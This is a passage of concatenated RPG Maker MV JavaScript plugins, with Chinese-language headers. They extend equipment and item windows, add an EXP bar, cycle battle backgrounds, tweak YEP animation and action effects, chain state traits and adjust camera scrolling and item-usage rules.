				}
				this.changePaintOpacity(true);
				this._equipEleIdxLast=idx;
			}
		}
		++this._equipEleCtr;
	}else this._equipEleCtr=0;
}).tbl={
_none:[],
changeIconFrame:64,
fontSize:20,
iconPad2:iconPad2,
txtWidth:undefined,
};
}

{ const p=Window_EquipSlot.prototype;
k='drawItem';
r=p[k]; (p[k]=function f(index){
	let rtv;
	if('undefined'!==typeof Moghunter) this.contents.fontSize = Moghunter.scEquip_FontSize;
	if(this._actor){
		const rect=this.itemRect(index);
		this.changeTextColor(this.systemColor());
		const en=this.isEnabled(index);
		this.changePaintOpacity(en);
		const txtw=f.tbl.txtw||(f.tbl.txtw=Math.ceil(this.textWidth('[]')));
		const xb=rect.x+f.tbl.offset_name,yb=rect.y,xe=rect.x+rect.width;
		const item=this._actor.equips()[index];
		this.drawItemName(item, xb, yb, f.tbl.offset_icons-xb);
		rtv=[item,rect,en,txtw>>1,f.tbl.offset_icons,yb,xe,yb+rect.height];
		this.changePaintOpacity(true);
	}
	return rtv;
}).ori=r;
p[k].tbl={
offset_name:138,
offset_icons:300,
txtw:undefined,
};
k='update';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.drawEquipEle_refreshIcon();
	return rtv;
}).ori=r;
k='select';
r=p[k]; (t=p[k]=function f(idx){
	const idxPre=this.index();
	const rtv=f.ori.apply(this,arguments);
	this.drawEquipEle_onSel(idxPre);
	return rtv;
}).ori=r;
}

{ const p=Window_ItemList.prototype;
p[k]=t;
k='drawItem';
r=p[k]; (p[k]=function f(index){
	let rtv;
	const item = this._data[index];
	if(item){
		const rect=this.itemRect(index),numberWidth=this.numberWidth();
		const w=rect.width-this.textPadding();
		const xe=rect.x+w-numberWidth,yb=rect.y;
		const en=this.isEnabled(item);
		this.changePaintOpacity(en);
		
		const txtw=this.textWidth('[]');
		
		let x=rect.x;
		const namew=this.drawItemName(item, x, yb, xe-x-
			txtw-
			(SceneManager._scene instanceof Scene_Depository?0:Window_Base._iconWidth)-
		f.tbl.iconPad2);
		if(0<namew) x+=namew;
		
		rtv=[item,rect,en,txtw>>1,x,yb,xe,yb+rect.height];
		
		this.drawItemNumber(item, rect.x, rect.y, w);
		this.changePaintOpacity(true);
	}
	return rtv;
}).ori=r;
p[k].tbl={
iconPad2:iconPad2,
txtw:undefined,
};
k='update';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.drawEquipEle_refreshIcon();
	return rtv;
}).ori=r;
}


if(typeof _mog_scEquip_Wequip_drawItemName!=='undefined'){ const p=Window_EquipItem.prototype;
k='drawItemName';
r=p[k]; (p[k]=function f(item, x, y, width){
	this.contents.fontSize = Moghunter.scEquip_FontSize;
	return Window_ItemList.prototype.drawItemName.call(this,item, x, y, width);
}).ori=r;
}


})();


﻿"use strict";
/*:
 * @plugindesc MOG角色詳細狀態視窗加入牙籤流exp條
 * @author agold404
 * @help as title
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const posTxtPath="BLR_custom/ExpBar/pos.txt";

{ const p=Scene_Status.prototype;
t={
dw:8,
path:posTxtPath,
re:{
r:/\r/g,
x:/(^|\n)[ \t]*x[ \t]*=([^\n]+)/,
y:/(^|\n)[ \t]*y[ \t]*=([^\n]+)/,
},
defaults:{
x:252,
y:7,
},
x:undefined,
y:undefined,
};
k='initialize';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	ImageManager.otherFiles_addLoad(f.tbl.path);
	return rtv;
}).ori=r;
p[k].tbl=t;
(p.createExpBar=function f(){
	const sp=this._expBar_sprite=new Sprite();
	sp .bitmap=ImageManager.loadNormalBitmap("BLR_custom/ExpBar/ExpBar.png");
	const sp2=this._expBar_sprite_bg=new Sprite();
	sp2.bitmap=ImageManager.loadNormalBitmap("BLR_custom/ExpBar/ExpBar_bg.png");
	this._field.addChildAt(sp2,this._field.getChildIndex(this._layout));
	this._field.addChildAt(sp ,this._field.getChildIndex(this._layout));
	if(f.tbl.x===undefined){
		const t=f.tbl,re=f.tbl.re;
		t.raw=ImageManager.otherFiles_getData(t.path);
		if(t.raw && t.raw.match){
			t.cleanedRaw=t.raw.replace(re.r,"");
			const mx=t.cleanedRaw.match(re.x),my=t.cleanedRaw.match(re.y);
			t.x=Number(mx&&mx[2]);
			t.y=Number(my&&my[2]);
		}else console.warn("file:\n",t.path,"\n","not loaded or is empty");
		if(isNaN(t.x)){ t.x=t.defaults.x; console.warn("set x =",t.x); }
		if(isNaN(t.y)){ t.y=t.defaults.y; console.warn("set y =",t.y); }
	}
	sp.dx=sp2.x=sp.x=f.tbl.x;
	sp.dy=sp2.y=sp.y=f.tbl.y;
	
	sp.bitmap.addLoadListener(this.updateExpBar.bind(this,true));
}).tbl=t;
k='createLayout';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.createExpBar();
	return rtv;
}).ori=r;
(p.updateExpBar=function f(isOnLoad){
	if(isOnLoad || this._actorLast!==this._actor){
		let rate=0;
		if(this._expBar_sprite.bitmap.width>0){
			const a=this._actorLast=this._actor;
			const currLv=a.currentLevelExp();
			rate=Math.min((a.currentExp()-currLv)/(a.nextLevelExp()-currLv),1);
		}
		this._expBar_width=~~(rate*this._expBar_sprite.bitmap.width);
		this._expBar_sprite.width=0;
	}
	const ref=this._layout,bg=this._expBar_sprite_bg,fg=this._expBar_sprite;
	fg.x=bg.x=ref.x+fg.dx;
	fg.y=bg.y=ref.y+fg.dy;
	const w=Math.min(fg.width+f.tbl.dw,this._expBar_width);
	if(fg.width!==w) fg.width=w;
}).tbl=t;
k='updateSlide';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.updateExpBar();
	return rtv;
}).ori=r;
t=undefined;
}

})();


﻿"use strict";
/*:
 * @plugindesc 設定循環戰鬥背景
 * @author agold404
 * @help 需在 $dataTroops[i] 物件上加上如同其他物件的 meta 屬性。
 * <backs1:num_frame_for_img_1,path_to_img_1_including_extension|num_frame_for_img_2,path_to_img_2_including_extension|...>
 * <backs2:num_frame_for_img_1,path_to_img_1_including_extension|num_frame_for_img_2,path_to_img_2_including_extension|...>
 * <backsLv:[[[num_frame_for_img_1,"path_to_img_1_including_extension_at_lowest_level"],[num_frame_for_img_2,"path_to_img_2_including_extension_at_lowest_level"],...],...[[num_frame_for_img_1,"path_to_img_1_including_extension_at_the_top_level"],[num_frame_for_img_2,"path_to_img_2_including_extension_at_the_top_level"],...]]>
 * the images automatically align to top-left corner: (0,0)
 * an empty string of path causes showing transparent
 *
 * example:
 * <backs1:2,img/pictures/pic1.png|4,img/pictures/pic2.png>
 * <backsLv:[[[8,"img/pictures/pic1.png"],[9,"img/pictures/pic2.png"]],[[6,"img/pictures/pic3.png"],[4,"img/pictures/pic4.png"]]]>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
(p.parseMeta_backsLv=function f(dataobj){
	const meta=dataobj&&dataobj.meta; if(!meta) return;
	if(meta.backs1){
		if(!dataobj.backsLv) dataobj.backsLv={};
		const obj=dataobj.backsLv.backs1=meta.backs1.split('|').map(f.forEach);
		if(obj.length) for(let x=1;x!==obj.length;++x) obj[x][0]+=obj[x-1][0];
	}
	if(meta.backs2){
		if(!dataobj.backsLv) dataobj.backsLv={};
		const obj=dataobj.backsLv.backs2=meta.backs2.split('|').map(f.forEach);
		if(obj.length) for(let x=1;x!==obj.length;++x) obj[x][0]+=obj[x-1][0];
	}
	if(meta.backsLv){
		if(!dataobj.backsLv) dataobj.backsLv={};
		const objv=dataobj.backsLv.lv=JSON.parse(meta.backsLv);
		for(let i=0,obj;i!==objv.length;++i){
			obj=objv[i];
			if(obj.length) for(let x=1;x!==obj.length;++x) obj[x][0]+=obj[x-1][0];
		}
	}
	if(dataobj.backsLv){
		if(!dataobj.backsLv.backs1) dataobj.backsLv.backs1=undefined;
		if(!dataobj.backsLv.backs2) dataobj.backsLv.backs2=undefined;
		if(!dataobj.backsLv.lv) dataobj.backsLv.lv=undefined;
	}
}).forEach=s=>{
	const idx=s.indexOf(',');
	return [Math.max(s.slice(0,idx)|0,0),s.slice(idx+1)];
};
k='start';
r=p[k]; (p[k]=function f(){
	$dataTroops.forEach(this.parseMeta_backsLv);
	return f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Spriteset_Battle.prototype;
p.createBattlebacksLv=function f(){
	const dataobj=$gameTroop.troop();
	const backsLv=this._backsLv_data=dataobj&&dataobj.backsLv&&dataobj.backsLv; if(!backsLv||!backsLv.lv) return;
	if(!this._backsLv_stat_lv) this._backsLv_stat_lv=[];
	const lvs=this._backsLvSprite=new Sprite();
	for(let x=0,sp;x!==backsLv.lv.length;++x){
		// TODO first load images here
		for(let z=0;z!==backsLv.lv[x].length;++z) if(backsLv.lv[x][z]) ImageManager.loadNormalBitmap(backsLv.lv[x][z][1]);
		sp=new Sprite(); sp.x=sp.y=0;
		lvs.addChild(sp);
		this._backsLv_stat_lv.push([-1,0]);
	}
	this._battleField.addChild(lvs);
};
k='createBattleback';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.createBattlebacksLv();
	return rtv;
}).ori=r;
(p.updateBacks=function f(){
	const data=this._backsLv_data; if(!data) return;
	let ok,arr,sp;
	
	ok=1;
	arr=data.backs1;
	sp=this._back1Sprite;
	if(arr && arr.length && sp){
		const tf=f.tbl.totalFrame(arr); if(tf){
			let forwarded=!this._backsLv_stat_1;
			if(forwarded) this._backsLv_stat_1=[0,0];
			const ic=this._backsLv_stat_1;
			if(ic[0]<arr.length && (!arr[ic[0]][0]||ic[1]>=arr[ic[0]][0])){
				++ic[0];
				forwarded=true;
			}
			if(ic[0]>=arr.length){
				ic[1]=ic[0]=0;
				forwarded=true;
			}
			if(forwarded){
				if(arr[ic[0]][1]) sp.bitmap=ImageManager.loadNormalBitmap(arr[ic[0]][1]);
				else sp.visible=false;
			}
			++ic[1];
		}else ok=0;
	}else ok=0;
	if(!ok && sp) sp.visible=false;
	
	ok=1;
	arr=data.backs2;
	sp=this._back2Sprite;
	if(arr && arr.length && sp){
		const tf=f.tbl.totalFrame(arr); if(tf){
			let forwarded=!this._backsLv_stat_2;
			if(forwarded) this._backsLv_stat_2=[0,0];
			const ic=this._backsLv_stat_2;
			if(ic[0]<arr.length && (!arr[ic[0]][0]||ic[1]>=arr[ic[0]][0])){
				++ic[0];
				forwarded=true;
			}
			if(ic[0]>=arr.length){
				ic[1]=ic[0]=0;
				forwarded=true;
			}
			if(forwarded){
				if(arr[ic[0]][1]) sp.bitmap=ImageManager.loadNormalBitmap(arr[ic[0]][1]);
				else sp.visible=false;
			}
			++ic[1];
		}else ok=0;
	}else ok=0;
	if(!ok && sp) sp.visible=false;
	
	if(this._backsLvSprite){ for(let z=0,arrv=data.lv;z!==arrv.length;++z){
		arr=arrv[z];
		sp=this._backsLvSprite.children[z];
		const tf=f.tbl.totalFrame(arr); if(tf){
			const ic=this._backsLv_stat_lv[z];
			let forwarded=false;
			if(ic[0]<0){
				ic[0]=0;
				forwarded=true;
			}
			if(ic[0]<arr.length && (!arr[ic[0]][0]||ic[1]>=arr[ic[0]][0])){
				++ic[0];
				forwarded=true;
			}
			if(ic[0]>=arr.length){
				ic[1]=ic[0]=0;
				forwarded=true;
			}
			if(forwarded){
				if(arr[ic[0]][1]) sp.bitmap=ImageManager.loadNormalBitmap(arr[ic[0]][1]);
				else sp.visible=false;
			}
			++ic[1];
		}else if(sp) sp.visible=false;
	} }
}).tbl={
totalFrame:dat=>dat.length?dat[dat.length-1][0]:0,
};
k='update';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.updateBacks();
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc YEP動畫功能擴充:動畫更新間格
 * @author agold404
 * @help 格式:
 * action animation: (原YEP參數欄位),(原YEP參數欄位),間格
 * 
 * 更精確的格式:
 * /action animation: [^,]*,[^,]*,[0-9]*.*$/i
 *
 * 範例:
 * action animation: ,,1
 *
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Sprite_Animation.prototype;
k='setup';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const rate=~~arguments[4];
	if(this._animation && 0<rate){
		this._rate=rate;
		this.setupDuration();
	}
	return rtv;
}).ori=r;
}

{ const p=BattleManager;
k='actionActionAnimation';
r=p[k]; (p[k]=function f(){
	this._logWindow._aniArgv=arguments[0];
	const rtv=f.ori.apply(this,arguments);
	this._logWindow._aniArgv=undefined;
	return rtv;
}).ori=r;
}

{ const p=Window_BattleLog.prototype;
k='showNormalAnimation';
r=p[k]; (p[k]=function f(targets,animationId,mirror,argv){
	if(!$dataAnimations[animationId]) return -1;
	f.tbl.argv0=arguments;
	f.tbl.argv1=argv||this._aniArgv;
	targets.forEach(f.tbl,this);
	f.tbl.argv1=f.tbl.argv0=undefined;
}).ori=r;
t=p[k].tbl=function f(trgt){
	const res=trgt.startAnimation(f.argv0[1],f.argv0[2],0,f.argv1&&f.argv1[2]);
	this.startAnimation_onsuccess(res,trgt);
};
t.argv1=t.argv0=undefined;
k='startAnimation_onsuccess';
p[k]=function f(addedCnt,trgt){};
p[k].tbl=p[k].ori=undefined;
}

{ const p=Game_Battler.prototype;
k='startAnimation';
r=p[k]; (p[k]=function f(animationId,mirror,delay,rate){
	const prelen=this._animations.length;
	f.ori.apply(this,arguments);
	const rtv=this._animations.length-prelen;
	if(rtv) this._animations.back.rate=rate;
	return rtv;
}).ori=r;
p.animationRequested_length=function(){ return this._animations.length; };
p.animationRequested_getn=function(n){ return this._animations[n]; };
p.animationRequested_clear=function(){ this._animations.length=0; };
}

{ const p=Sprite_Battler.prototype;
k='setupAnimation';
r=p[k]; (p[k]=function(){
	const prelen=this._animationSprites.length;
	const settingDatav=[];
	for(let x=0,xs=this._battler.animationRequested_length(),data,ani,mir,dly,r,opt;x!==xs;++x){
		data=this._battler.animationRequested_getn(x);
		ani = $dataAnimations[data.animationId];
		mir = data.mirror;
		dly = ani.position === 3 ? 0 : data.delay;
		r = data.rate;
		opt = data.opt;
		settingDatav.push(data);
		this.startAnimation(ani, mir, dly, r, opt);
	}
	this._battler.animationRequested_clear();
	for(let z=prelen,zs=this._animationSprites.length,sp;z!==zs;++z){
		sp = this._animationSprites[z];
		sp._settingData=settingDatav[z-prelen];
		sp.visible = this._battler.isSpriteVisible();
	}
}).ori=r;
if(typeof _alias_mog_bhud_sprt_actor_setupAnimation!=='undefined') delete Sprite_Actor.prototype.setupAnimation;
}

{ const p=Sprite_Base.prototype;
k='startAnimation';
r=p[k]; (p[k]=function(animation, mirror, delay, rate, opt){
	const sp=new Sprite_Animation();
	sp.setup(this._effectTarget, animation, mirror, delay, rate);
	this.parent.addChild(sp);
	this._animationSprites.push(sp);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc YEP功能擴充:action effect指定屬性
 * @author agold404
 * @help action effect: ,,是否特殊;是否物攻;是否魔攻,增加屬性A;增加屬性B;增加屬性C...
 * 範例:
 * action effect: ,,0;1;0,4;4;8;7;6;3
 * action effect: ,,,4;4;8;7;6;3
 * action effect: ,,0;1;0
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=BattleManager;
k='actionActionEffect';
r=p[k]; (p[k]=function f(){
	if(this._action) this._action._effArgv=arguments[0];
	const rtv=f.ori.apply(this,arguments);
	if(this._action) this._action._effArgv=undefined;
	return rtv;
}).ori=r;
}

{ const p=Game_Action.prototype;
(p.getOverwrite_hitType=function f(){
	if(this._effArgv&&this._effArgv[f.tbl]) return this._effArgv[f.tbl].split(';').map(Number);
}).tbl=2;
(p.getOverwrite_element=function f(){
	if(this._effArgv&&this._effArgv[f.tbl]) return [this._effArgv[f.tbl].split(';').map(Number)];
}).tbl=3;
k='getItemHitTypeTbl';
r=p[k]; (p[k]=function f(){
	return this.getOverwrite_hitType()||f.ori.apply(this,arguments);
}).ori=r;
k='getAllElements';
r=p[k]; (p[k]=function f(){
	return this.getOverwrite_element()||f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc trait: 被上/解除某狀態A時，不會被上狀態A，並移除狀態B、上狀態C。
 * @author agold404
 * @help note: <狀態新增變化ra:{"被上此狀態A時，不新增此狀態，並":{"移除":[id,id,...],"加入":[id,id,...]}}>
 * <狀態解除變化ra:{"被解除此狀態A時，不解除此狀態，並":{"移除":[id,id,...],"加入":[id,id,...]}}>
 * json 格式
 * 
 * 範例：
 * <狀態新增變化ra:{"1":{"移除":[2,3,4,5,6,7,8,9],"加入":[22,23,24,25,26,27,28,29]}}>
 * <狀態新增變化ra:{"1":{"移除":[2,3,4,5,6,7,8,9],"加入":[22,23,24,25,26,27,28,29]},"101":{"移除":[112,113,114,115,116,117,118,119],"加入":[122,123,124,125,126,127,128,129]}}>
 * <狀態解除變化ra:{"1":{"移除":[2,3,4,5,6,7,8,9],"加入":[22,23,24,25,26,27,28,29]}}>
 * <狀態解除變化ra:{"1":{"移除":[2,3,4,5,6,7,8,9],"加入":[22,23,24,25,26,27,28,29]},"101":{"移除":[112,113,114,115,116,117,118,119],"加入":[122,123,124,125,126,127,128,129]}}>
 *
 * * 死亡狀態被新增再被拔掉，該角色HP會 = 1。
 *
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; for(let x=0,arr=[['新增','addState',],['解除','removeState',]];x!==arr.length;++x){

const gbb=Game_BattlerBase,kwp='狀態'+arr[x][0],kwsuffix='變化ra',kw=kwp+kwsuffix;
const kwt='TRAIT_'+kw;
const kwget="get_"+kw;
const kwfilter="_"+kw+'_filter';
const kwmain="_"+kwsuffix+'_main';
const kwmain0="_"+kwsuffix+'_main0';
const kwtemp="_"+kw+'_temp';

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		const tbl=JSON.parse(meta[kw]);
		for(let i in tbl) dataobj.traits.push({code:gbb[kwt],dataId:~~i,value:tbl[i]||0});
	}
};
}

{ const p=Game_Battler.prototype;
p[kwget]=function(){ return this.traits(gbb[kwt]); };
(p[kwfilter]=function f(arr,dataId){ // arr: traits returned by p[kwget]
	if(!arr._map) arr._map=new Map();
	let rtv=arr._map.get(dataId);
	if(!rtv) arr._map.set(dataId,rtv=arr.filter(f.tbl,dataId));
	return rtv;
}).tbl=function f(t){ return this===t.dataId; };
k=arr[x][1]; // k='addState'; k='removeState';
r=p[k]; (p[k]=function f(stateId){
	let rtv;
	const ori=this[kwtemp];
	//if(!this[kwmain].apply(this,arguments)) rtv=f.ori.apply(this,arguments);
	if(!this[kwmain](stateId,kwmain0,kwget,kwfilter,kwtemp)) rtv=f.ori.apply(this,arguments);
	if(!ori) this[kwtemp]=ori;
	return rtv;
}).ori=r;
if(!p[kwmain]) (p[kwmain]=function f(stateId,kwmain0,kwget,kwfilter,kwtemp){
	let traits=this[kwtemp]; if(traits) return;
	traits=this[kwtemp]=this[kwget]();
	if(this[kwfilter](traits,stateId).length){
		const allFinalAdds=new Map(),allCurrAdds=new Set();
		let allAddedSerial=~~0;
		const finalAdds=[],finalRms=[];
		for(let currAdds=[stateId];currAdds.length;){
			const res=this[kwmain0](traits,currAdds,kwfilter);
			if(!res){
				finalAdds.uniquePushContainer(currAdds);
				break;
			}
			
			for(let x=0,arr=res[0];x!==arr.length;++x){
				finalRms.uniquePush(arr[x]);
				finalAdds.uniquePop(arr[x]);
			}
			
			currAdds.length=0;
			for(let x=0,arr=res[1];x!==arr.length;++x){
				if(this[kwfilter](traits,arr[x]).length){
					if(allCurrAdds.has(arr[x])) finalAdds.uniquePush(arr[x]);
					else{
						allCurrAdds.add(arr[x]);
						currAdds.push(arr[x]);
					}
				}else{
					finalAdds.uniquePush(arr[x]);
					allFinalAdds.set(arr[x],++allAddedSerial);
				}
			}
		}
		finalRms.forEach(f.tbl.r,this);
		finalAdds.sort((a,b)=>allFinalAdds.get(a)-allFinalAdds.get(b)).forEach(f.tbl.a,this);
		return true;
	}
}).tbl={
r:function(stateId){ this.removeState(stateId); },
a:function(stateId){ this.addState(stateId); },
};
if(!p[kwmain0]) (p[kwmain0]=function f(traits,currAdds,kwfilter){
	// return: [removeListU,addListU]
	const rtv=[[],[]];
	let notFound=true;
	for(let x=0;x!==currAdds.length;++x){
		for(let ti=0,ts=this[kwfilter](traits,currAdds[x]);ti!==ts.length;++ti){
			notFound=false;
			for(let act=0,arr;act!==rtv.length;++act){
				const stateIds=ts[ti].value[f.tbl[act]];
				if(stateIds && stateIds.length){
					for(let i=0,stateId;i!==stateIds.length;++i){
						stateId=stateIds[i];
						if(rtv[act].uniqueHas(stateId)) continue;
						rtv[act].uniquePush(stateId);
					}
				}
			}
		}
	}
	return !notFound&&rtv;
}).tbl=["移除","加入"];
}

} })();


﻿"use strict";
/*:
 * @plugindesc Game_Player.prototype.updateScroll + offset(x,y)
 * @author agold404
 * @help always add offset x,y to cam pos when using Game_Player.prototype.updateScroll
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Player.prototype;
k='initMembers';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._camScrollOffsetX=0;
	this._camScrollOffsetY=0;
	return rtv;
}).ori=r;
k='updateScroll';
r=p[k]; (p[k]=function f(lastScrolledX,lastScrolledY){
	const x1=lastScrolledX,y1=lastScrolledY;
	const ox =this._camScrollOffsetX      ||0,oy =this._camScrollOffsetY      ||0;
	const oxl=this._camScrollOffsetX_last ||0,oyl=this._camScrollOffsetY_last ||0;
	const x2=this.scrolledX()+(ox-oxl),y2=this.scrolledY()+(oy-oyl);
	const cx=this.centerX()-ox,cy=this.centerY()-oy;
	if (y2 > y1 && y2 > cy) {
		$gameMap.scrollDown(y2 - y1);
	}
	if (x2 < x1 && x2 < cx) {
		$gameMap.scrollLeft(x1 - x2);
	}
	if (x2 > x1 && x2 > cx) {
		$gameMap.scrollRight(x2 - x1);
	}
	if (y2 < y1 && y2 < cy) {
		$gameMap.scrollUp(y1 - y2);
	}
	this._camScrollOffsetX_last=this._camScrollOffsetX;
	this._camScrollOffsetY_last=this._camScrollOffsetY;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 調整被麻痺者是否能使用道具
 * @author agold404
 * @help $gameSystem.set_isCanUseItemWhenParalyzed(true_or_false);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_System.prototype;
k='set_isCanUseItemWhenParalyzed';
r=p[k]; (p[k]=function f(){
	return this._is_canUseItemWhenParalyzed=arguments[0];
}).ori=r;
k='get_isCanUseItemWhenParalyzed';
r=p[k]; (p[k]=function f(){
	return this._is_canUseItemWhenParalyzed;
}).ori=r;
}

{ const p=Game_BattlerBase.prototype;
k='meetsUsableItemConditions';
r=p[k]; (p[k]=function f(item){
	return $gameSystem.get_isCanUseItemWhenParalyzed()?
		$dataItems.tbl.has(item) && this.isOccasionOk(item):
		f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Scene_Item.prototype;
k='update';
r=p[k]; (p[k]=function f(){
	this._cache=undefined;
	return f.ori.apply(this,arguments);
}).ori=r;
k='user';
r=p[k]; (p[k]=function f(item){
	item=item||this.item();
	if(item && this._cache && this._cache.item===item) return this._cache.user;
	const members=$gameParty.members();
	let bestPha=-Infinity,bestActor=f.tbl;
	for(let x=0;x!==members.length;++x){
		if(members[x].canUse(item) && bestPha<members[x].pha){
			bestPha=members[x].pha;
			bestActor=members[x];
		}
	}
	this._cache={
		item:item,
		user:bestActor,
	};
	return bestActor;
}).ori=r;
t=p[k].tbl={
canUse:()=>false,
};
for(let x=0,arr=['determineItem','useItem','canUse','isItemEffectsValid','applyItem',];x!==arr.length;++x){
k=arr[x];
r=p[k]; (p[k]=function f(item){
	return this.user() !==f.tbl && f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=t;
}
k='itemTargetActors';
r=p[k]; (p[k]=function f(item){
	return this.user() !==f.tbl && f.ori.apply(this,arguments) || [];
}).ori=r;
p[k].tbl=t;
}

})();


﻿"use strict";
/*:
 * @plugindesc 指定道具/技能只能由某些角色來使用
 * @author agold404
 * @help <usageTags:...>
 * 道具/技能note區表下列其一即可
 * 有traits者表此物件會增加下列所有tag
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kwp='usageTags',kw=kwp+'';
const kwt='TRAIT_'+kw;
const kwget="get_"+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors .forEach(f.tbl[0]);
	$dataClasses.forEach(f.tbl[0]);
	$dataWeapons.forEach(f.tbl[0]);
	$dataArmors .forEach(f.tbl[0]);
	$dataStates .forEach(f.tbl[0]);
	$dataEnemies.forEach(f.tbl[0]);
	$dataSkills.forEach(f.tbl[1]);
	$dataItems .forEach(f.tbl[1]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
(dataobj)=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		const arr=JSON.parse(meta[kw]);
		for(let x=0;x!==arr.length;++x) dataobj.traits.push({code:gbb[kwt],dataId:arr[x],value:1});
	}
},
(dataobj)=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]) dataobj[kw]=new Set(JSON.parse(meta[kw]));
},
];
}

{ const p=Game_BattlerBase.prototype;
k='meetsUsableItemConditions';
r=p[k]; (p[k]=function f(item){
	return this[f.tbl](item) && f.ori.apply(this,arguments);
}).ori=r;
t=k+'_'+kw;
p[k].tbl=t;
k=t;
r=p[k]; (p[k]=function f(item){
	const s=item && item[kw]; if(!s) return true;
	return this[f.tbl[0]]().some(f.tbl[1],s);
}).ori=r;
p[k].tbl=[
kwget,
function(t){ return this.has(t.dataId); },
];
k=kwget;
r=p[k]; (p[k]=function f(){
	return this.traits(gbb[kwt]);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 指定道具/技能只能用在某些角色
 * @author agold404
 * @help <usedOnTags:...>
 * 道具/技能note區表下列其一即可
 * 有traits者表此物件會增加下列所有tag
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kwp='usedOnTags',kw=kwp+'';
const kwt='TRAIT_'+kw;
const kwget="get_"+kw;
const kwmain=kw+"_main";

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors .forEach(f.tbl[0]);
	$dataClasses.forEach(f.tbl[0]);
	$dataWeapons.forEach(f.tbl[0]);
	$dataArmors .forEach(f.tbl[0]);
	$dataStates .forEach(f.tbl[0]);
	$dataEnemies.forEach(f.tbl[0]);
	$dataSkills.forEach(f.tbl[1]);
	$dataItems .forEach(f.tbl[1]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
(dataobj)=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		const arr=JSON.parse(meta[kw]);
		for(let x=0;x!==arr.length;++x) dataobj.traits.push({code:gbb[kwt],dataId:arr[x],value:1});
	}
},
(dataobj)=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]) dataobj[kw]=new Set(JSON.parse(meta[kw]));
},
];
}

{ const p=Game_Battler.prototype;
k=kwget;
r=p[k]; (p[k]=function f(){
	return this.traits(gbb[kwt]);
}).ori=r;
k=kwmain;
r=p[k]; (p[k]=function f(item){
	const s=item && item[kw]; if(!s) return true;
	return this[f.tbl[0]]().some(f.tbl[1],s);
}).ori=r;
p[k].tbl=[
kwget,
function(t){ return this.has(t.dataId); },
];
}

{ const p=Game_Action.prototype;
k='testApply';
r=p[k]; (p[k]=function f(trgt){
	return trgt[kwmain](this.item()) && f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 調整跳躍幀數
 * @author agold404
 * @help Game_Character._jumpCountDelta , Game_Character._jumpCountSetTo , Game_Character._jumpCountSubMore
 * 
 * effect on Game_Character._jumpCount when Game_Character.jump is called
 * Game_Character._jumpCountDelta = a number (mostly int)
 * Game_Character._jumpCountSetTo = a positive number (mostly int)
 *
 * * Game_Character._jumpCountSetTo overwrites Game_Character._jumpCountDelta
 *
 * 
 * Game_Character._jumpCountSubMore makes the counter substract more when Game_Character.updateJump is called
